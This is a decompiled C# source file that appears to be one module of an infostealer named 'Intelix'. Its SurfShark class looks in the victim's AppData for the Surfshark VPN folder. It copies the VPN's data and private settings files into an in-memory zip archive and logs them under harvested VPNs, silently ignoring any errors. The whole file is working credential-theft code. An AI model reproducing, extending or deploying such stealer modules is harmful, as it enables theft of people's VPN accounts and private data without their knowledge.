using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn
{
	// Token: 0x02000015 RID: 21
	public class SurfShark : ITarget
	{
		// Token: 0x0600003D RID: 61 RVA: 0x000035F8 File Offset: 0x000017F8
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Surfshark");
			bool flag = !Directory.Exists(text);
			if (!flag)
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Surfshark";
				string[] array = new string[]
				{
					"data.dat",
					"settings.dat",
					"settings-log.dat",
					"private_settings.dat"
				};
				foreach (string path in array)
				{
					try
					{
						string path2 = Path.Combine(text, path);
						bool flag2 = File.Exists(path2);
						if (flag2)
						{
							zip.AddFile(Path.Combine("Surfshark", path), File.ReadAllBytes(path2));
						}
					}
					catch
					{
					}
				}
				counterApplications.Files.Add(text + " => Surfshark");
				counterApplications.Files.Add("Surfshark\\");
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
